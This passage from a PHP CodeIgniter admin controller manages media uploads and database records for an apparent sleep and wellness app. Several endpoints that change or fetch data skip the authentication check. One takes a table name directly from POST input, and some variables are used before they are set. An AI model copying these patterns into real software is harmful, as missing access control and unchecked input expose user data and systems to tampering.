                    "description" => $_POST['description']
                );
                if ($this->AdminModel->insertToSleepEnhancer($insertArr)) {
                    $_SESSION['sleepEnhancerFlag'] = 1;
                } else {
                    $_SESSION['sleepEnhancerFlag'] = 0;
                }
            } else {
                $_SESSION['sleepEnhancerFlag'] = 2;
            }

            redirect('sleepEnhancer');
        }
    }

    /**
     * Evening Program
     */
    public function evening_program() {
        $this->checkAuth();

        $data['language'] = $this->AdminModel->getMastersData('language_master', '*');
        $data['gender'] = $this->AdminModel->getMastersData('gender_master', '*');
        $data['program'] = $this->AdminModel->getMastersData('programs_master', '*');
        $data['duration'] = $this->AdminModel->getMastersData('durations_master', '*');

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('modules/evening_program/evening_program', $data);
        $this->load->view('commons/footer');
    }

    /**
     * Sleep Enhancer Enable
     */
    public function sleep_enhancer_enable() {
        if ($this->AdminModel->changeSleepEnhancer_status(1, $_POST['id'])) {
            $response['status'] = 1;
        } else {
            $response['status'] = 0;
        }
        echo json_encode($response);
    }
    
    public function dud_song_enable() {
        if ($this->AdminModel->changeDUDSongs_status(1, $_POST['id'])) {
            $response['status'] = 1;
        } else {
            $response['status'] = 0;
        }
        echo json_encode($response);
    }
    
    public function dud_song_disable() {
        if ($this->AdminModel->changeDUDSongs_status(0, $_POST['id'])) {
            $response['status'] = 1;
        } else {
            $response['status'] = 0;
        }
        echo json_encode($response);
    }


    /**
     * Sleep Enhancer Disable  
     */ 
    public function sleep_enhancer_disable() {
        if ($this->AdminModel->changeSleepEnhancer_status(0, $_POST['id'])) {
            $response['status'] = 1;
        } else {
            $response['status'] = 0;
        }
        echo json_encode($response);
    }


    /**
     * Add Get To Sleep
     */
    public function getToSleep_add() {
        if (($_SERVER['REQUEST_METHOD'] == 'POST') && ($_POST['request'])) {

			$imagePrefix = time();
			$ext = pathinfo($_FILES["video"]['name'], PATHINFO_EXTENSION);
			$file_name = 'getToSleepVideo' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/mp3/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp3';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('video')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag = 0;
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$videoFileName = $data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
			}

            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["thumb"]['name'], PATHINFO_EXTENSION);
			$file_name = 'getToSleepThumb' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('thumb')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$thumbFileName = $data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
			}

            $insertArr = array(
                "language" => $_POST['language'],
                "duration" => $_POST['duration'],
                "gender" => $_POST['gender'],
                "program" => $_POST['program'],
                "custom_file_name" => $_POST['custom_file_name'],
                "thumb_url" => $thumbFileName,
                "video_url" => $videoFileName     
            );

            if ($this->AdminModel->addGetToSleep($insertArr)) {
                $_SESSION['getToSleepAdd'] = 'added';
            } else {
                $_SESSION['getToSleepAdd'] = 'failed';
            }

            redirect('getToSleep');

        }
    }

    public function editGetToSleep() {
        if (empty($_FILES["video"]['name']) == false) {
            $imagePrefix = time();
			$ext = pathinfo($_FILES["video"]['name'], PATHINFO_EXTENSION);
			$file_name = 'getToSleepVideo' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/mp3/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp3';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('video')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag = 0;
                $insertArr = array(
                    "video_url" => $videoFileName
                );
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$videoFileName = $data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
			}
        }

        if (empty($_FILES["thumb"]['name']) == false) {
            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["thumb"]['name'], PATHINFO_EXTENSION);
			$file_name = 'getToSleepThumb' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('thumb')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
			} else {
				$data = array('upload_video_data' => $this->upload->data());
				$thumbFileName = $data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
                $insertArr['thumb_url'] = $thumbFileName;
			}
        }

        $insertArr['custom_file_name'] = $_POST['custom_file_name'];
        $insertArr['language'] = $_POST['language'];
        $insertArr['duration'] = $_POST['duration'];
        $insertArr['gender'] = $_POST['gender'];
        $insertArr['program'] = $_POST['program']; 

        if ($this->AdminModel->editGetToSleep($insertArr, $_POST['get_to_sleep_id'])) {
            $_SESSION['getToSleepAdd'] = 'added';
        } else {
            $_SESSION['getToSleepAdd'] = 'failed';
        }

        redirect('getToSleep');
    }

    public function get_to_sleep_fetch() {
        $data['get_to_sleep_data'] = $this->AdminModel->getAllGetToSleep_id($_POST['id']);
        if ($data['get_to_sleep_data']) {
            $data['status'] = 1;
        } else {
            $data['status'] = 0;
        }

        echo json_encode($data);
    }

    /**
     * Wake Up List
     */
    public function wakeUp_list() {
        $this->checkAuth();

        $data['language'] = $this->AdminModel->getMastersData('language_master', '*');
        $data['program'] = $this->AdminModel->getMastersData('wake_up_programs', '*');
        $data['gender'] = $this->AdminModel->getMastersData('gender_master', '*');

        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $data['mainData'] = $this->AdminModel->getWakeUpDataByFiler($_POST['language'], $_POST['program'], $_POST['gender']);
        } else {
            $data['mainData'] = false;
        }

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('modules/wake_up/wake_up_list', $data);
        $this->load->view('commons/footer');
    }

    /**
     * Wake Up Add
     */
    public function wakeUp_add() {
        $this->checkAuth();

        $data['language'] = $this->AdminModel->getMastersData('language_master', '*');
        $data['program'] = $this->AdminModel->getMastersData('wake_up_programs', '*');
        $data['gender'] = $this->AdminModel->getMastersData('gender_master', '*');

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('modules/wake_up/wake_up_add', $data);
        $this->load->view('commons/footer');
    }

    public function editWakeUp() {
        $this->checkAuth();

        $data['language'] = $this->AdminModel->getMastersData('language_master', '*');
        $data['program'] = $this->AdminModel->getMastersData('wake_up_programs', '*');
        $data['gender'] = $this->AdminModel->getMastersData('gender_master', '*');
        $data['wakeUpData'] = $this->AdminModel->getWakeUpByID($_GET['id']);
        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('modules/wake_up/wake_up_edit', $data);
        $this->load->view('commons/footer');
    }

    /**
     * Library Management
     */
    public function libraryMgmt() {
        $this->checkAuth();
        $data["languageData"] = $this->AdminModel->getAllLanguages_api();
        $data['ytLinks'] = $this->AdminModel->getAllYtLinks();
        $data["categoryData"] = $this->AdminModel->getCategoryDataForLibrary();

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('modules/library/libraryHome', $data);
        $this->load->view('commons/footer');
    }
    
    public function createLibraryCategory() {
        
        if ($this->AdminModel->createLibraryCategory($_POST["category_name"])) {
            $_SESSION["libraryYT"] = 1;
        }
        
        redirect('libraryMgmt');
    }
    
    public function editLibraryCategory() {
        $updateArr = array(
            "category_name" => $_POST["category_name"]
        );
        
        if ($this->AdminModel->updateLibraryCategory($updateArr, $_POST["id"])) {
            $_SESSION["libraryYT"] = 1;   
        }
        
        redirect("libraryMgmt");
    }

    public function libraryMgmt_fetch() {
        $data['yt_data'] = $this->AdminModel->libraryMgmt_fetch($_POST['id']);
        if ($data['yt_data']) {
            $data['status'] = 1;
        } else {
            $data['status'] = 0;
        }

        echo json_encode($data);
    }
    
    public function getLibraryCategoryDataByID() {
        $data["response"] = $this->AdminModel->getLibraryCategoryDataByID($_POST["id"]);
        if ($data["response"]) {
            $data["status"] = 1;
        } else {
            $data["status"] = 0;
        }
        
        echo json_encode($data);
    }

    public function editLibraryMgmtYtLink() {
        
        if (empty($_FILES["thumbName"]['name']) == false) {
            
            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["thumbName"]['name'], PATHINFO_EXTENSION);
			$file_name = 'ytThumb' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			if (!$this->upload->do_upload('thumbName')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
               
			} else {
              
				$data = array('upload_video_data' => $this->upload->data());
				$thumbFileName = $data['upload_video_data']['file_name'];
				$videoUploadFlag = 1;
                $updateArr["thumbName"] = $thumbFileName;
			}

        }

        $updateArr["custom_file_name"] = $_POST['custom_file_name'];
        $updateArr["link"] = $_POST['ytLink'];
        $updateArr["article_name"] = $_POST['article_name'];
        $updateArr["article_link"] = $_POST['article_link'];
        $updateArr["language_id"] = $_POST["language_id"];
        $updateArr["library_management_category_id"] = $_POST["category_id"];

        if ($this->AdminModel->libraryMgmt_edit($updateArr, $_POST['yId'])) {

        } else {
            die('failed');
        }

        redirect('libraryMgmt');
    }

   
    /**
     * Feedback Section
     */
    public function feedBack() {

        $this->checkAuth();

        $data['mainData'] = $this->AdminModel->getAllFeedBackData();
        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('modules/analytics/feedback', $data);
        $this->load->view('commons/footer');
    }

    /**
     * Library Management
     */
    public function addLibraryMgmtYtLink() {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {

            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["thumbName"]['name'], PATHINFO_EXTENSION);
			$file_name = 'ytVideo' . $imagePrefix1 . '.' . $ext;
			$config['upload_path']          = './uploads/thumb/';
			$config['allowed_types']        = 'gif|jpg|png|jpeg';
			$config['max_size']             = 0;
            $config['file_name'] = $file_name;
			$this->load->library('upload', $config);

			if (!$this->upload->do_upload('thumbName')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
			} else {
				$data = array('upload_thumb_data' => $this->upload->data());
				$thumbFileName2 = $data['upload_thumb_data']['file_name'];
				//$thumbFileURL = base_url('assets/images/galleries/').$data['upload_thumb_data']['file_name'];
				$thumbUploadFlag = 1;
			}

            $insertArr = array(
                "link" => $_POST['ytLink'],
                "custom_file_name" => $_POST['custom_file_name'],
                "article_name" => $_POST['article_name'],
                "article_link" => $_POST['article_link'],
                "language_id" => $_POST["language_id"],
                "thumbName" => $thumbFileName2,
                "library_management_category_id" => $_POST["category_id"]
            );

            if ($this->AdminModel->addLibraryMgmtYTlink($insertArr)) {
                $_SESSION['libraryYT'] = 1;
            } else {
                
            }
            redirect('libraryMgmt');
        }
    }

    public function wakeUpUpdate() {
        if (empty($_FILES["main_thumb"]['name']) == false) {

            //upload thumb
            $imagePrefix1 = time();
            $ext = pathinfo($_FILES["main_thumb"]['name'], PATHINFO_EXTENSION);
            $file_name = 'wakeUp' . $imagePrefix1 . '.' . $ext;
            $config['upload_path'] = './uploads/thumb/';
            $config['allowed_types'] = 'gif|jpg|png|jpeg';
            $config['overwrite'] = TRUE;
            $config['file_ext_tolower'] = TRUE;
            $config['file_name'] = $file_name;
            $this->load->library('upload', $config);
 
            if (!$this->upload->do_upload('main_thumb')) {
                $error = array('error' => $this->upload->display_errors());
                echo '<pre>';print_r($error);die();
                $thumbUploadFlag = 0;
            } else {
                $data = array('upload_thumb_data' => $this->upload->data());
                $eveningVideoArr['main_thumb'] = $data['upload_thumb_data']['file_name'];
                //$thumbFileURL = base_url('assets/images/galleries/').$data['upload_thumb_data']['file_name'];
                $thumbUploadFlag = 1;
            }
 
            unset($config);	

        }

        if (empty($_FILES["sub1thumbFile"]['name']) == false) {

            //upload thumb
            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["sub1thumbFile"]['name'], PATHINFO_EXTENSION);
            $file_name = 'wakeUp' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);

			if (!$this->upload->do_upload('sub1thumbFile')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
			} else {
				$data = array('upload_thumb_data' => $this->upload->data());
				$eveningVideoArr['thumb1'] = $data['upload_thumb_data']['file_name'];
				//$thumbFileURL = base_url('assets/images/galleries/').$data['upload_thumb_data']['file_name'];
				$thumbUploadFlag = 1;
			}

        }

        if (empty($_FILES["sub2thumbFile"]['name']) == false) {
            
            //upload thumb
            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["sub2thumbFile"]['name'], PATHINFO_EXTENSION);
            $file_name = 'wakeUp' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);

			if (!$this->upload->do_upload('sub2thumbFile')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
			} else {
				$data = array('upload_thumb_data' => $this->upload->data());
				$eveningVideoArr['thumb2'] = $data['upload_thumb_data']['file_name'];
				//$thumbFileURL = base_url('assets/images/galleries/').$data['upload_thumb_data']['file_name'];
				$thumbUploadFlag = 1;
			}

            unset($config);

        }

        if (empty($_FILES["sub3thumbFile"]['name']) == false) {
            
            //upload thumb
            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["sub3thumbFile"]['name'], PATHINFO_EXTENSION);
            $file_name = 'wakeUp' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);

			if (!$this->upload->do_upload('sub3thumbFile')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
			} else {
				$data = array('upload_thumb_data' => $this->upload->data());
				$eveningVideoArr['thumb3'] = $data['upload_thumb_data']['file_name'];
				//$thumbFileURL = base_url('assets/images/galleries/').$data['upload_thumb_data']['file_name'];
				$thumbUploadFlag = 1;
			}

            unset($config);

        }

        

        if (empty($_FILES["sub1videoFile"]['name']) == false) {
            
            //upload video
			$imagePrefix = time();
			$ext = pathinfo($_FILES["sub1videoFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'screen_' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/video/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp4';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			
			if (!$this->upload->do_upload('sub1videoFile')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag1 = 0;
			} else {
				$data = array('upload_video_data_1' => $this->upload->data());
				$eveningVideoArr['sub1Url'] = $data['upload_video_data_1']['file_name'];
				//$thumbFileURL = base_url('assets/evening_video/').$data['upload_video_data']['file_name'];
				$videoUploadFlag1 = 1;
			}

			unset($config);

        }

        if (empty($_FILES["sub2videoFile"]['name']) == false) {
            
            //upload video
			$imagePrefix = time();
			$ext = pathinfo($_FILES["sub2videoFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'screen_' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/video/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp4';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			
			if (!$this->upload->do_upload('sub2videoFile')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag1 = 0;
			} else {
				$data = array('upload_video_data_1' => $this->upload->data());
				$eveningVideoArr['sub2Url'] = $data['upload_video_data_1']['file_name'];
				//$thumbFileURL = base_url('assets/evening_video/').$data['upload_video_data']['file_name'];
				$videoUploadFlag1 = 1;
			}

			unset($config);

        }

        if (empty($_FILES["sub3videoFile"]['name']) == false) {
            
            //upload video
			$imagePrefix = time();
			$ext = pathinfo($_FILES["sub3videoFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'screen_' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/video/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp4';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			
			if (!$this->upload->do_upload('sub3videoFile')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag1 = 0;
			} else {
				$data = array('upload_video_data_1' => $this->upload->data());
				$eveningVideoArr['sub3Url'] = $data['upload_video_data_1']['file_name'];
				//$thumbFileURL = base_url('assets/evening_video/').$data['upload_video_data']['file_name'];
				$videoUploadFlag1 = 1;
			}

			unset($config);

        }

        $eveningVideoArr['main_custom_name'] = $_POST['main_custom_name'];
        $eveningVideoArr['subOneName'] = $_POST['subOneName'];
        $eveningVideoArr['subTwoName'] = $_POST['subTwoName'];
        $eveningVideoArr['subThreeName'] = $_POST['subThreeName'];
        $eveningVideoArr['program'] = $_POST['program'];
        $eveningVideoArr['language'] = $_POST['language'];
        $eveningVideoArr['gender'] = $_POST['gender'];

        $this->AdminModel->updateWakeUp($eveningVideoArr, $_POST['wakeUpId']);

        redirect('wakeUpList');

    }

    /**
     * Wake Up Upload
     */
    public function uploadWakeUpVideo() {

		if (($_SERVER['REQUEST_METHOD'] == 'POST') && ($_POST['request']) && ($_POST['request'] == 'addWakeUpVideos')) {

            //upload thumb
            $imagePrefix1 = time();
            $ext = pathinfo($_FILES["main_thumb"]['name'], PATHINFO_EXTENSION);
            $file_name = 'wakeUp' . $imagePrefix1 . '.' . $ext;
            $config['upload_path'] = './uploads/thumb/';
            $config['allowed_types'] = 'gif|jpg|png|jpeg';
            $config['overwrite'] = TRUE;
            $config['file_ext_tolower'] = TRUE;
            $config['file_name'] = $file_name;
            $this->load->library('upload', $config);
 
            if (!$this->upload->do_upload('main_thumb')) {
                $error = array('error' => $this->upload->display_errors());
                echo '<pre>';print_r($error);die();
                $thumbUploadFlag = 0;
            } else {
                $data = array('upload_thumb_data' => $this->upload->data());
                $main_thumb = $data['upload_thumb_data']['file_name'];
                //$thumbFileURL = base_url('assets/images/galleries/').$data['upload_thumb_data']['file_name'];
                $thumbUploadFlag = 1;
            }
 
            unset($config);	


            //upload thumb
            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["sub1thumbFile"]['name'], PATHINFO_EXTENSION);
            $file_name = 'wakeUp' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);

			if (!$this->upload->do_upload('sub1thumbFile')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
			} else {
				$data = array('upload_thumb_data' => $this->upload->data());
				$thumbFileName1 = $data['upload_thumb_data']['file_name'];
				//$thumbFileURL = base_url('assets/images/galleries/').$data['upload_thumb_data']['file_name'];
				$thumbUploadFlag = 1;
			}

            unset($config);	

			//upload thumb
            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["sub2thumbFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'wakeUp' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);

			if (!$this->upload->do_upload('sub2thumbFile')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
			} else {
				$data = array('upload_thumb_data' => $this->upload->data());
				$thumbFileName2 = $data['upload_thumb_data']['file_name'];
				//$thumbFileURL = base_url('assets/images/galleries/').$data['upload_thumb_data']['file_name'];
				$thumbUploadFlag = 1;
			}

            unset($config);	

			//upload thumb
            $imagePrefix1 = time();
			$ext = pathinfo($_FILES["sub3thumbFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'wakeUp' . $imagePrefix1 . '.' . $ext;
			$config['upload_path'] = './uploads/thumb/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'gif|jpg|png|jpeg';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			$this->load->library('upload', $config);

			if (!$this->upload->do_upload('sub3thumbFile')) {
				$error = array('error' => $this->upload->display_errors());
				$thumbUploadFlag = 0;
			} else {
				$data = array('upload_thumb_data' => $this->upload->data());
				$thumbFileName3 = $data['upload_thumb_data']['file_name'];
				//$thumbFileURL = base_url('assets/images/galleries/').$data['upload_thumb_data']['file_name'];
				$thumbUploadFlag = 1;
			}

            unset($config);

            

				

			//upload video
			$imagePrefix = time();
			$ext = pathinfo($_FILES["sub1videoFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'screen_' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/video/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp4';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			
			if (!$this->upload->do_upload('sub1videoFile')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag1 = 0;
			} else {
				$data = array('upload_video_data_1' => $this->upload->data());
				$videoFileName1 = $data['upload_video_data_1']['file_name'];
				//$thumbFileURL = base_url('assets/evening_video/').$data['upload_video_data']['file_name'];
				$videoUploadFlag1 = 1;
			}

			unset($config);	

			//upload video
			$imagePrefix = time();
			$ext = pathinfo($_FILES["sub2videoFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'screen_' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/video/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp4';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			
			if (!$this->upload->do_upload('sub2videoFile')) {
				$error = array('error' => $this->upload->display_errors());
				$videoUploadFlag2 = 0;
			} else {
				$data = array('upload_video_data_2' => $this->upload->data());
				$videoFileName2 = $data['upload_video_data_2']['file_name'];
				//$thumbFileURL = base_url('assets/evening_video/').$data['upload_video_data']['file_name'];
				$videoUploadFlag2 = 1;
			}

			unset($config);	

			//upload Sub 3 video
			$imagePrefix = time();
			$ext = pathinfo($_FILES["sub3videoFile"]['name'], PATHINFO_EXTENSION);
			$file_name = 'screen_' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/video/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp4';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			
			if (!$this->upload->do_upload('sub3videoFile')) {
				$error = array('error' => $this->upload->display_errors());
                echo '<pre>';print_r($error);die();
				$videoUploadFlag3 = 0;
			} else {
				$data = array('upload_video_data_3' => $this->upload->data());
				$sub3videoFile = $data['upload_video_data_3']['file_name'];
				//$thumbFileURL = base_url('assets/evening_video/').$data['upload_video_data']['file_name'];
				$videoUploadFlag3 = 1;
			}
			
			if (($videoUploadFlag1 == 1) && ($videoUploadFlag2 == 1) && ($videoUploadFlag3 == 1)) {
				$eveningVideoArr = array(
                    "main_custom_name" => $_POST['main_custom_name'],
                    "main_thumb" => $main_thumb,
					"sub1URL" => $videoFileName1,
					"sub2URL" => $videoFileName2,
					"sub3URL" => $sub3videoFile,
					"thumb1" => $thumbFileName1,
					"thumb2" => $thumbFileName2,
					"thumb3" => $thumbFileName3,
					"subOneName" => $_POST['subOneName'],
					"subTwoName" => $_POST['subTwoName'],
					"subThreeName" => $_POST['subThreeName'],
					"program" => $_POST['program'],
					"language" => $_POST['language'],
					"gender" => $_POST['gender']
                );

				if ($this->AdminModel->uploadWakeUpData($eveningVideoArr)) {
					$_SESSION['addWakeUpFlag'] = "File uploaded and db updated successfully";	
				} else {
					$_SESSION['addWakeUpFlag'] = "File uploaded but db updations failed";
				}
			} else {
				$_SESSION['addWakeUpFlag'] = 'File uploading failed: Only PNG [image] & MP4 [video] is allowed!';
			}
		} else {
			$_SESSION['addWakeUpFlag'] = 'Failed';
		}
		redirect('wakeUpList');
	}

    public function introVideosManagement() {
        $this->checkAuth();

        $data['mainData'] = $this->AdminModel->getAllIntroVideos_5_api();

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('introVideosManagement', $data);
        $this->load->view('commons/footer');
    }

    public function addIntroVideo() {
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {

            $imagePrefix = time();
			$ext = pathinfo($_FILES["video"]['name'], PATHINFO_EXTENSION);
			$file_name = 'intro_file_' . $imagePrefix . '.' . $ext;
			$config['upload_path'] = './uploads/video/';
			$config['max_size']         = '';
			$config['max_width']        = '';
			$config['max_height']       = '';
			$config['allowed_types'] = 'mp4';
			$config['overwrite'] = TRUE;
			$config['file_ext_tolower'] = TRUE;
			$config['file_name'] = $file_name;
			
			$this->load->library('upload', $config);
			$this->upload->initialize($config);
			
			if (!$this->upload->do_upload('video')) {
				$error = array('error' => $this->upload->display_errors());
                echo '<pre>';print_r($error);die();
				$videoUploadFlag3 = 0;
			} else {
				$data = array('upload_video_data_3' => $this->upload->data());
				$fileName = $data['upload_video_data_3']['file_name'];
				//$thumbFileURL = base_url('assets/evening_video/').$data['upload_video_data']['file_name'];
				$videoUploadFlag3 = 1;
			}

            if ($videoUploadFlag3 == 1) {
                if ($this->AdminModel->uploadIntroVideo($fileName)) {
					$_SESSION['introVideosMgmt'] = "File uploaded and db updated successfully";	
				} else {
					$_SESSION['introVideosMgmt'] = "File uploaded but db updations failed";
				}

                redirect('introVideosManagement');

            } else {
                die('123');
            }

        }
    }


    /**
     * ****************************************************** NEW ***************************************************************
     */

    public function videoManagement() {
        $this->checkAuth();
        
        $data["languageData"] = $this->AdminModel->getAllLanguages_api();
        
        if (isset($_GET['filterFor'])) {

            switch ($_GET['filterFor']) {
                case 'introVideos':
                    $data['data'] = $this->AdminModel->getIntroVideos();
                    $data['query'] = 'intro_videos_5_master';
                    break;
                
                case 'infoPageVideo':
                    $data['data'] = $this->AdminModel->getInfoVideos();
                    $data['query'] = 'info_page_video';
                    break;

                case 'animation':
                    $data['data'] = $this->AdminModel->getVideosByFilter('animation_video');
                    $data['query'] = 'animation_video';
                    break;

                default:
                    $data['data'] = false;
                    break;
            }

        } else {
            $data['data'] = false;
        }

        $this->load->view('commons/header');
        $this->load->view('commons/sidebar');
        $this->load->view('videoManagement', $data);
        $this->load->view('commons/footer');
    }
    
    public function get_videomanagement_data() {
        if (($_SERVER['REQUEST_METHOD'] == 'POST') && ($_POST['id']) && ($_POST["query"])) {
            $data['data'] = $this->AdminModel->get_videomanagement_byId($_POST['id'], $_POST["query"]);
            echo json_encode($data['data']);
        }
    }
    
    public function editIntroVideoMgmt() {
        
        $errorFlag = 0;
